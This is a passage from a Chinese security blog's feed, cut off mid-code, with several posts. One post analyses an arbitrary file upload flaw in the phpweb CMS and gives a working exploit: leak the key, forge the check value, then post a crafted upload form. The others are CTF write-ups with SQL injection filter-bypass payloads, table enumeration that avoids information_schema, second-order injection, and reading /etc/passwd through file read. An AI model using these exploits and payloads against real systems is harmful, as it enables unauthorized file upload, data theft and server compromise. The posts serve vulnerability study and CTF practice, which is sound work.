        &lt;h1 id=&quot;暴力破解-百度api识别图形验证码学习记录&quot;&gt;&lt;a href=&quot;#暴力破解-百度api识别图形验证码学习记录&quot; class=&quot;headerlink&quot; title=&quot;暴力破解-百度api识别图形验证码学习记录&quot;&gt;&lt;/a&gt;暴力破解-百度api识别图形验证码学习记录&lt;/
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://c1aysec.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="python" scheme="https://c1aysec.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>phpweb前台任意文件上传</title>
    <link href="https://c1aysec.github.io/2020/01/10/phpweb%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://c1aysec.github.io/2020/01/10/phpweb前台任意文件上传/</id>
    <published>2020-01-09T16:07:20.714Z</published>
    <updated>2020-01-09T16:41:55.965Z</updated>
    
    <content type="html"><![CDATA[<h1 id="phpweb前台任意文件上传"><a href="#phpweb前台任意文件上传" class="headerlink" title="phpweb前台任意文件上传"></a>phpweb前台任意文件上传</h1><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>存在漏洞的代码位置：</p><p>/base/appplus.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//密钥校验</span></div><div class="line">$k=md5(strrev($dbUser.$dbPass));</div><div class="line">$h=$_SERVER[<span class="string">"HTTP_REFERER"</span>];</div><div class="line">$t=$_POST[<span class="string">"t"</span>];</div><div class="line">$m=$_POST[<span class="string">"m"</span>];</div><div class="line">$act=$_POST[<span class="string">"act"</span>];</div><div class="line">$path=$_POST[<span class="string">"path"</span>];</div><div class="line"></div><div class="line">$md5=md5($k.$t);</div><div class="line"><span class="keyword">if</span>($m!=$md5)&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"ERROR: 安全性校验错误"</span>;</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//文件上传</span></div><div class="line"><span class="keyword">if</span>($act==<span class="string">"upload"</span>)&#123;</div><div class="line"></div><div class="line">$file=$_FILES[<span class="string">"file"</span>];</div><div class="line">$r_size=$_POST[<span class="string">"r_size"</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"ERROR"</span>] &gt; <span class="number">0</span>)&#123;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"ERROR:"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"ERROR"</span>].<span class="string">"&lt;br /&gt;"</span>;</div><div class="line">  <span class="keyword">exit</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">if</span>($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>]!=$r_size)&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"ERROR:上传文件错误，文件大小和原文件不匹配"</span>;</div><div class="line">@write_log(<span class="string">"app.log"</span>,date(<span class="string">"Y-m-d H:i:s"</span>,time()).<span class="string">" ERROR: 上传文件错误，文件大小和原文件不匹配\n"</span>,FILE_APPEND);</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//检查目录名</span></div><div class="line"></div><div class="line"><span class="keyword">if</span>($path!=<span class="string">""</span>)&#123;</div><div class="line">$ToPath=<span class="string">"../"</span>.$path;</div><div class="line">$Tofile=$ToPath.<span class="string">"/"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line"><span class="keyword">if</span>(!is_dir($ToPath))&#123;</div><div class="line">@mkdir($ToPath,<span class="number">0777</span>);</div><div class="line">&#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">$ToPath=<span class="string">"../update/"</span>;</div><div class="line">$Tofile=<span class="string">"../update/"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!is_writable($ToPath))&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"ERROR:"</span>.$ToPath.<span class="string">" 目录不可写，请设置目录属性为可写"</span>;</div><div class="line">@write_log(<span class="string">"app.log"</span>,date(<span class="string">"Y-m-d H:i:s"</span>,time()).<span class="string">" ERROR: "</span>.$ToPath.<span class="string">" 目录不可写，请设置目录属性为可写\n"</span>,FILE_APPEND);</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(file_exists($Tofile) &amp;&amp; !is_writable($Tofile))&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"ERROR:"</span>.$Tofile.<span class="string">" 文件不能覆盖，请设置文件属性为可写"</span>;</div><div class="line">@write_log(<span class="string">"app.log"</span>,date(<span class="string">"Y-m-d H:i:s"</span>,time()).<span class="string">" ERROR: "</span>.$Tofile.<span class="string">" 文件不能覆盖，请设置文件属性为可写\n"</span>,FILE_APPEND);</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//复制文件</span></div><div class="line">copy($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],$Tofile);</div><div class="line"></div><div class="line"><span class="keyword">switch</span>($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>])&#123;</div><div class="line"></div><div class="line"><span class="keyword">case</span> <span class="string">"application/octet-stream"</span>:</div><div class="line">@chmod($Tofile,<span class="number">0755</span>);</div><div class="line"><span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="keyword">default</span>:</div><div class="line">@chmod($Tofile,<span class="number">0666</span>);</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">"文件上传成功: "</span> .substr($Tofile,<span class="number">3</span>);</div><div class="line">@write_log(<span class="string">"app.log"</span>,date(<span class="string">"Y-m-d H:i:s"</span>,time()).<span class="string">" 文件上传成功: "</span>.substr($Tofile,<span class="number">3</span>).<span class="string">"\n"</span>,FILE_APPEND);</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>可以看到这里存在任意文件上传，但是前提是需要通过密钥校验</p><p><img src="http://pic.c1imber.top/blog/20200110/axlunRoNQX9I.png?imageslim" alt="mark"></p><p>这里的<code>$m</code>和<code>$t</code>都是可控的，如果可以在代码当中找到<code>$k</code>的值，就可以通过密钥校验</p><p>通过全局搜索<code>md5(strrev($dbUser.$dbPass))</code>可以在/base/post.php找到该值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">$act = $_POST[<span class="string">'act'</span>];</div><div class="line"></div><div class="line"><span class="keyword">switch</span>($act)&#123;</div><div class="line">...</div><div class="line">...</div><div class="line"><span class="keyword">case</span> <span class="string">"appcode"</span> :</div><div class="line">$pluslable=$_POST[<span class="string">'pluslable'</span>];</div><div class="line">$apptype=$_POST[<span class="string">'apptype'</span>];</div><div class="line">$coltype=$_POST[<span class="string">'coltype'</span>];</div><div class="line">$tempid=$_POST[<span class="string">'tempid'</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>($apptype==<span class="string">"plus"</span>)&#123;</div><div class="line">$msql-&gt;query(<span class="string">"select id from &#123;P&#125;_base_plusdefault where `pluslable`='$pluslable'"</span>);</div><div class="line"><span class="keyword">if</span>($msql-&gt;next_record())&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"1000"</span>;</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line">$msql-&gt;query(<span class="string">"select id from &#123;P&#125;_base_coltype where `coltype`='$coltype'"</span>);</div><div class="line"><span class="keyword">if</span>($msql-&gt;next_record())&#123;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"2000"</span>;</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($apptype==<span class="string">"border"</span>)&#123;</div><div class="line">$msql-&gt;query(<span class="string">"select id from &#123;P&#125;_base_border where `tempid`='$tempid'"</span>);</div><div class="line"><span class="keyword">if</span>($msql-&gt;next_record())&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"1000"</span>;</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$code=<span class="string">"k="</span>.md5(strrev($dbUser.$dbPass)).<span class="string">"&amp;t="</span>.time();</div><div class="line"><span class="keyword">echo</span> $code;</div><div class="line"><span class="keyword">exit</span>;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><p>step1:获取<code>$k</code>:<code>md5(strrev($dbUser.$dbPass))</code></p><p><a href="http://192.168.157.130/phpweb/3151/base/post.php" target="_blank" rel="external">http://192.168.157.130/phpweb/3151/base/post.php</a><br>post：act=appcode<br><img src="http://pic.c1imber.top/blog/20200110/Wr17MV9wp8aG.png?imageslim" alt="mark"></p><p>step2:通过<code>$k</code>构造<code>$m</code>和<code>md5($k.$t)</code>,使<code>$m===$md5</code><br><img src="http://pic.c1imber.top/blog/20200110/U5wkxGxKhYDL.png?imageslim" alt="mark"></p><p>step3:构造上传exp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.157.130/phpweb/3151/base/appplus.php"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span>Upload a new file:<span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"act"</span> <span class="attr">value</span>=<span class="string">"upload"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"m"</span> <span class="attr">value</span>=<span class="string">"26478db11a74b3c8675f463fee30cba7"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"t"</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"r_size"</span> <span class="attr">value</span>=<span class="string">"18"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">size</span>=<span class="string">"18"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"upload"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure><p>本地构造好上传页面直接上传即可</p><p>注意这里<code>$_POST[&#39;r_size&#39;]</code>要和<code>$_FILES[&#39;file&#39;][&#39;size&#39;]</code>大小相等（字节）</p><p><img src="http://pic.c1imber.top/blog/20200110/ojRmuDjY4Qsz.png?imageslim" alt="mark"></p><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/7053" title="phpweb前台任意文件上传" target="_blank" rel="external">https://xz.aliyun.com/t/7053</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;phpweb前台任意文件上传&quot;&gt;&lt;a href=&quot;#phpweb前台任意文件上传&quot; class=&quot;headerlink&quot; title=&quot;phpweb前台任意文件上传&quot;&gt;&lt;/a&gt;phpweb前台任意文件上传&lt;/h1&gt;&lt;h3 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏
      
    
    </summary>
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>ctf记录-记一次有趣的注入</title>
    <link href="https://c1aysec.github.io/2019/11/03/ctf%E8%AE%B0%E5%BD%95-%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84%E6%B3%A8%E5%85%A5/"/>
    <id>https://c1aysec.github.io/2019/11/03/ctf记录-记一次有趣的注入/</id>
    <published>2019-11-03T02:29:00.000Z</published>
    <updated>2019-11-06T17:11:00.406Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctf记录-记一次有趣的注入绕过"><a href="#ctf记录-记一次有趣的注入绕过" class="headerlink" title="ctf记录-记一次有趣的注入绕过"></a>ctf记录-记一次有趣的注入绕过</h1><p>正常页面：<br>xxx/article.php?id=2</p><p>当<code>id=2&#39;</code>时返回404(页面不正常)，但是没有sql报错信息<br><img src="http://pic.c1imber.top/blog/20191103/3bsc8Vsv4JIk.png?imageslim" alt="mark"><br>当<code>id=2&quot;</code>时返回正常页面<br><img src="http://pic.c1imber.top/blog/20191103/pid239dEOaan.png?imageslim" alt="mark"><br>所以有可能是单引号包裹的字符型无报错回显注入</p><p>当<code>id=2&#39;--</code>时– 被过滤，<code>id=2&#39;%23</code>页面正常显示,基本确定了存在注入<br><img src="http://pic.c1imber.top/blog/20191103/VQCYSJ7NGEI7.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/20191103/NBypRnQjWQ31.png?imageslim" alt="mark"></p><p>该注入存在过滤，通过简单测试，发现大致过滤了order、information_schema、and、or、逗号等字符，并且对union select进行了过滤，但是union和select单独出现并没有过滤</p><p>另外该注入无sql报错回显，只能使用union联合查询和盲注，由于前者在页面有回显，所以这里优先选择前者</p><p>选择union注入的话，总结出需要突破的几个点：</p><pre><code>1、需要突破对union select的过滤，另外order被过滤，所以不能通过order by判断列数2、注入不能使用逗号3、不能使用information_schema</code></pre><p>接下来，对这些限制进行突破，总之，过滤了什么，绕什么就行了~</p><p>突破1：</p><p>mysql当中<code>/**/</code>可以代替空格，可以使用<code>union/**/select</code>绕过对<code>union select</code>的过滤</p><p>order被过滤，不能使用order by判断列数，使用以下方式判断列数</p><pre><code>id=2&apos; union/**/select 1id=2&apos; union/**/select 1,2...    </code></pre><p>但是这里使用了逗号，被拦截<br><img src="http://pic.c1imber.top/blog/20191103/n0Ssb5lx5C6f.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/20191103/hlj42riH3JhY.png?imageslim" alt="mark"></p><p>突破2：</p><p>不能使用逗号，可以使用子查询绕过</p><pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d%23</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/FAgbn0kGvekX.png?imageslim" alt="mark"><br>回显位在2和4，尝试检查查询一些信息，查询成功</p><pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select user())d%23</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/quddeGfhqJ6i.png?imageslim" alt="mark"></p><pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select version())d%23</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/vOUMiM47pRt8.png?imageslim" alt="mark"></p><pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select database())d%23</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/LLR8lDCOKcbU.png?imageslim" alt="mark"><br>但是在通过<code>information_schema</code>获取表名和列名时，被拦截</p><p>突破3：</p><p>关于注入不能使用<code>information_schema</code>,记得之前s1ye师傅有提到过绕过的方法，那时没有怎么研究，又去请教了一番s1ye师傅，得到解答~</p><p>当不能使用<code>information_schema</code>时，可以使用<code>select group_concat(distinct table_name)from mysql.innodb_index_stats</code>获取到表名，很强（看来有必要仔细阅读一下mysql的官方手册了）</p><p>获取表名：<br><code>id=112&#39; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select group_concat(distinct table_name)from mysql.innodb_index_stats)d%23</code><br><img src="http://pic.c1imber.top/blog/20191103/H4AwS6Lzcqdy.png?imageslim" alt="mark"></p><p>接下来就是关于无列名注入的问题了，继续使用子查询就可以解决，获取flag~</p><pre><code>id=112&apos; union/**/select * from ((select 1)a join (select 2)b join (select 3)c join (select group_concat(`3`) from (select * from ((select 1)a join (select 2)b join (select 3)c) union/**/select * from fl111aa44a99g)x)d)%23</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/mvbTH4konJGF.png?imageslim" alt="mark"></p><p>拖延症真的很可怕</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ctf记录-记一次有趣的注入绕过&quot;&gt;&lt;a href=&quot;#ctf记录-记一次有趣的注入绕过&quot; class=&quot;headerlink&quot; title=&quot;ctf记录-记一次有趣的注入绕过&quot;&gt;&lt;/a&gt;ctf记录-记一次有趣的注入绕过&lt;/h1&gt;&lt;p&gt;正常页面：&lt;br&gt;xxx/a
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2019极客巅峰ctf记录</title>
    <link href="https://c1aysec.github.io/2019/10/20/2019%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0ctf%E8%AE%B0%E5%BD%95/"/>
    <id>https://c1aysec.github.io/2019/10/20/2019极客巅峰ctf记录/</id>
    <published>2019-10-19T16:50:00.000Z</published>
    <updated>2019-11-06T17:03:35.474Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2019极客巅峰ctf记录"><a href="#2019极客巅峰ctf记录" class="headerlink" title="2019极客巅峰ctf记录"></a>2019极客巅峰ctf记录</h1><p><strong>周六抽时间做了2019极客巅峰的ctf,发现自己是真的菜，需要找个地方沉淀一下，所以将做出的题记录记录在博客</strong></p><h3 id="aweb-1"><a href="#aweb-1" class="headerlink" title="aweb_1"></a>aweb_1</h3><p><img src="http://pic.c1imber.top/blog/20191020/zY6KbGAP9u64.png?imageslim" alt="mark"></p><p><strong>提示admin才能看到flag1</strong><br><img src="http://pic.c1imber.top/blog/20191020/T16DhJOQLBjb.png?imageslim" alt="mark"></p><p><strong>发现注册处用户名参数存在二次注入，有过滤，使用`name=admin’/</strong>/and/<strong>/‘3`绕过</strong><br><img src="http://pic.c1imber.top/blog/20191020/2mtrs07TKjak.png?imageslim" alt="mark"><br><strong>注册成功，用户名：assssssssss@qq.com，密码：123456’,登录成功，成功获取到flag</strong><br><img src="http://pic.c1imber.top/blog/20191020/xlGk67iKvFUf.png?imageslim" alt="mark"></p><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p><strong>这道题线上没做出来，比赛结束后研究了一波，:(</strong><br><img src="http://pic.c1imber.top/blog/20191019/VjLvacUQM2uY.png?imageslim" alt="mark"></p><p><strong>打开题目,首页有三个模块，分别为</strong></p><p><strong>查看文件：file.php?file=</strong><br><img src="http://pic.c1imber.top/blog/20191019/1aLGVXSWXCvO.png?imageslim" alt="mark"></p><p><strong>上传文件：upload_file.php</strong><br><img src="http://pic.c1imber.top/blog/20191019/o2XlzFejE61c.png?imageslim" alt="mark"></p><p><strong>下载文件：download.php</strong><br><img src="http://pic.c1imber.top/blog/20191019/KaNmoB7m2Jq9.png?imageslim" alt="mark"></p><p><strong>下载文件页面泄露了部分的源代码，代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">$name = $_GET[<span class="string">'name'</span>];</div><div class="line">$url = $_SERVER[<span class="string">'QUERY_STRING'</span>];</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($name))&#123;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\.|etc|var|tmp|usr/i'</span>, $url))&#123;</div><div class="line">        <span class="keyword">echo</span>(<span class="string">"hacker!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">            <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $name = safe_replace($name);</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">                $filename = $name.<span class="string">'.php'</span>;</div><div class="line">                $dir =<span class="string">"./"</span>;</div><div class="line">                $down_host = $_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/'</span>;</div><div class="line">                <span class="keyword">if</span>(file_exists(<span class="keyword">__DIR__</span>.<span class="string">'/'</span>.$dir.$filename))&#123;</div><div class="line">                    $file = fopen ( $dir.$filename, <span class="string">"rb"</span> );</div><div class="line">                    Header ( <span class="string">"Content-type: application/octet-stream"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Ranges: bytes"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Length: "</span> . filesize ( $dir.$filename ) );</div><div class="line">                    Header ( <span class="string">"Content-Disposition: attachment; filename="</span> . $filename );</div><div class="line">                    <span class="keyword">echo</span> fread ( $file, filesize ( $dir . $filename ) );</div><div class="line">                    fclose ( $file );</div><div class="line">                    <span class="keyword">exit</span> ();</div><div class="line">                &#125;<span class="keyword">else</span>&#123;</div><div class="line">                    <span class="keyword">echo</span> (<span class="string">"file doesn't exist."</span>);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/flag/i'</span>, $name))&#123;</div><div class="line">                <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>这里存在文件下载漏洞，但是存在过滤，暂时无法绕过</strong></p><p><strong>查看页面源代码发现hint:提示flag文件的位置位于<code>/flag</code></strong><br><img src="http://pic.c1imber.top/blog/20191019/10OYU1mrceLm.png?imageslim" alt="mark"></p><p><strong>回过头发现查看文件模块存在任意文件读取:<code>/file.php?file=/etc/passwd</code></strong><br><img src="http://pic.c1imber.top/blog/20191019/4TclaUEmLrtg.png?imageslim" alt="mark"></p><p><strong>尝试直接读取flag文件。失败：</strong><br><img src="http://pic.c1imber.top/blog/20191019/T9xIQW4ABzPz.png?imageslim" alt="mark"></p><p><strong>尝试读取download.php:<code>/file.php?file=download.php</code>读取失败</strong><br><img src="http://pic.c1imber.top/blog/20191019/Q2oFRSeddAD1.png?imageslim" alt="mark"><br><strong>修改为绝对路径<code>/file.php?file=/var/www/html/download.php</code>,读取成功</strong><br><img src="http://pic.c1imber.top/blog/20191019/4wezOnEoEe8a.png?imageslim" alt="mark"><br><strong>完整源码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;html&gt;</div><div class="line">&lt;pre&gt;    </div><div class="line"></div><div class="line">$name = $_GET[<span class="string">'name'</span>];</div><div class="line">$url = $_SERVER[<span class="string">'QUERY_STRING'</span>];</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($name))&#123;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\.|etc|var|tmp|usr/i'</span>, $url))&#123;</div><div class="line">        <span class="keyword">echo</span>(<span class="string">"hacker!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">            <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $name = safe_replace($name);</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">                $filename = $name.<span class="string">'.php'</span>;</div><div class="line">                $dir =<span class="string">"./"</span>;</div><div class="line">                $down_host = $_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/'</span>;</div><div class="line">                